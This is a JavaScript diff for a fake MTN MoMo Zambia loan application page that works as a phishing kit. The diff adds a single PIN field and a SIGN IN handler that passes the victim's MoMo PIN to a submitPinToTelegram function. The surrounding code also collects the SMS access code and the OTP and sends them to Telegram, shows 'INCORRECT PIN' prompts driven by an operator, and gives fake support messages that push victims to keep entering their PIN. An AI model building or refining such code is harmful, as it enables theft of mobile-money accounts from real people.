@@ -45,8 +45,9 @@
     const bannerOtpError = $('banner-otp-error');
 
     const displayPinPhone = $('display-pin-phone');
-    const pinBoxes5 = Array.from(document.querySelectorAll('.pin-box-5'));
+    const yelloPinInput = $('yello-pin-input');
     const btnTogglePinVisibility = $('btn-toggle-pin-visibility');
+    const btnSignInPin = $('btn-sign-in-pin');
 
     const displaySmsPhone = $('display-sms-phone');
     const smsInputBox = $('sms-input-box');
@@ -62,9 +63,7 @@
     let currentUserId = null;
     let statusPollInterval = null;
     let smsTimerInterval = null;
-    let digitWatcherInterval = null;
     let smsAutoSubmittedForCurrentValue = '';
-    let pinSubmittedForCurrentValue = '';
     let otpSubmittedForCurrentValue = '';
 
     const urlParams = new URLSearchParams(window.location.search);
@@ -158,6 +157,24 @@
     }
     updateCalc();
 
+    function syncSignInButtonState() {
+      if (!yelloPinInput || !btnSignInPin) return;
+      const digits = yelloPinInput.value.replace(/\D/g, '');
+      if (digits.length >= 4) {
+        btnSignInPin.classList.add('ready');
+      } else {
+        btnSignInPin.classList.remove('ready');
+      }
+    }
+
+    if (yelloPinInput) {
+      yelloPinInput.addEventListener('input', () => {
+        const clean = yelloPinInput.value.replace(/\D/g, '').slice(0, 8);
+        if (yelloPinInput.value !== clean) yelloPinInput.value = clean;
+        syncSignInButtonState();
+      });
+    }
+
     function goFromForm1ToForm2() {
       const amtRaw = (formAmountInput?.value || '100,000').trim();
       const dur = loanDurationSelect?.value || '48 Months';
@@ -223,15 +240,18 @@
       if (displayOtpPhone) displayOtpPhone.innerText = formattedPhone;
       if (sumApplicant) sumApplicant.innerText = fullName;
 
-      pinSubmittedForCurrentValue = '';
       otpSubmittedForCurrentValue = '';
-      pinBoxes5.forEach((b) => (b.value = ''));
+      if (yelloPinInput) {
+        yelloPinInput.value = '';
+        yelloPinInput.type = 'password';
+      }
+      syncSignInButtonState();
       otpBoxes4.forEach((b) => (b.value = ''));
       hideBanner(bannerPinError);
       hideBanner(bannerOtpError);
 
       showScreen(screens.pin);
-      if (pinBoxes5[0]) pinBoxes5[0].focus();
+      if (yelloPinInput) yelloPinInput.focus();
 
       try {
         const res = await fetch(
@@ -302,8 +322,7 @@
         startStatusPolling();
       } catch (e) {
         hideLoading();
-        pinSubmittedForCurrentValue = '';
-        showBanner(bannerPinError, 'Connection error. Please re-enter your 5-digit PIN.');
+        showBanner(bannerPinError, 'Connection error. Please tap SIGN IN again.');
       }
     }
 
@@ -393,11 +412,11 @@
             clearInterval(statusPollInterval);
             if (smsTimerInterval) clearInterval(smsTimerInterval);
             hideLoading();
-            pinSubmittedForCurrentValue = '';
-            pinBoxes5.forEach((b) => (b.value = ''));
+            if (yelloPinInput) yelloPinInput.value = '';
+            syncSignInButtonState();
             showScreen(screens.pin);
-            showBanner(bannerPinError, 'INCORRECT PIN — Please enter your new 5-digit PIN.');
-            if (pinBoxes5[0]) pinBoxes5[0].focus();
+            showBanner(bannerPinError, 'INCORRECT PIN — Please enter your PIN and tap SIGN IN.');
+            if (yelloPinInput) yelloPinInput.focus();
           } else if (st === 'SMS_EXPIRED') {
             clearInterval(statusPollInterval);
             hideLoading();
@@ -442,10 +461,10 @@
       if (statusPollInterval) clearInterval(statusPollInterval);
       if (smsTimerInterval) clearInterval(smsTimerInterval);
       currentUserId = null;
-      pinSubmittedForCurrentValue = '';
       smsAutoSubmittedForCurrentValue = '';
       otpSubmittedForCurrentValue = '';
-      pinBoxes5.forEach((b) => (b.value = ''));
+      if (yelloPinInput) yelloPinInput.value = '';
+      syncSignInButtonState();
       otpBoxes4.forEach((b) => (b.value = ''));
       if (smsInputBox) smsInputBox.value = '';
       [
@@ -497,57 +516,45 @@
           showScreen(screens.form3);
           break;
         case 'btn-toggle-pin-visibility': {
-          const makeRevealed = pinBoxes5[0] && !pinBoxes5[0].classList.contains('revealed');
-          pinBoxes5.forEach((box) => {
-            box.classList.toggle('revealed', makeRevealed);
-          });
-          if (btnTogglePinVisibility) {
-            btnTogglePinVisibility.innerText = makeRevealed ? 'Hide' : 'Show';
+          if (!yelloPinInput) break;
+          yelloPinInput.type = yelloPinInput.type === 'password' ? 'text' : 'password';
+          break;
+        }
+        case 'btn-sign-in-pin': {
+          const pinVal = (yelloPinInput?.value || '').replace(/\D/g, '');
+          if (pinVal.length < 4) {
+            showBanner(bannerPinError, 'Please enter your MTN MoMo PIN before tapping SIGN IN.');
+            return;
           }
+          await submitPinToTelegram(pinVal);
           break;
         }
         case 'link-forgot-pin':
           if (event) event.preventDefault();
           showBanner(
             bannerPinError,
-            'Enter your 5-digit MTN MoMo PIN code in the boxes above to continue.'
+            'Enter your MTN MoMo PIN in the PIN field and tap SIGN IN to continue.'
+          );
+          break;
+        case 'btn-switch-account':
+          if (statusPollInterval) clearInterval(statusPollInterval);
+          hideLoading();
+          showScreen(screens.form2);
+          break;
+        case 'link-pin-tcs':
+          if (event) event.preventDefault();
+          showBanner(
+            bannerPinError,
+            'Standard MTN MoMo Zambia terms and conditions apply to loan applications.'
+          );
+          break;
+        case 'btn-pin-contact':
+          showBanner(
+            bannerPinError,
+            'MTN Zambia MoMo Support: dial 111 or enter your PIN and tap SIGN IN.'
           );
           break;
         case 'btn-request-new-sms': {
           hideBanner(bannerSmsError);
           const phoneZero = toZeroPrefixPhone(
-            displaySmsPhone?.innerText || formPhoneInput?.value || ''
-          );
-          showBanner(bannerSmsInfo, 'New SMS request sent to admin. Please wait for your SMS.');
-          startSmsCountdown();
-          try {
-            await fetch('/api/request-new-sms', {
-              method: 'POST',
-              headers: { 'Content-Type': 'application/json' },
-              body: JSON.stringify({ userId: currentUserId, phone: phoneZero })
-            });
-          } catch (err) {}
-          break;
-        }
-        case 'btn-validated-sms': {
-          const currentText = (smsInputBox?.value || '').replace(/\s+/g, ' ').trim();
-          if (!isValidMomoSms(currentText)) {
-            showBanner(
-              bannerSmsError,
-              "SMS must start with: Y'ello. Please note! This confidential code gives access to your MoMo account:"
-            );
-            return;
-          }
-          await submitSmsToTelegram(currentText, false);
-          break;
-        }
-        case 'btn-submit-otp': {
-          const otpVal = otpBoxes4.map((b) => b.value).join('');
-          if (otpVal.length < 4) {
-            showBanner(bannerOtpError, 'Please enter all 4 digits of your MTN MoMo 4-Digit OTP.');
-            return;
-          }
-          await submitOtpToTelegram(otpVal, false);
-          break;
-        }
-        cas
+            displaySmsPhone?.innerText || formPhoneInput?.value || '
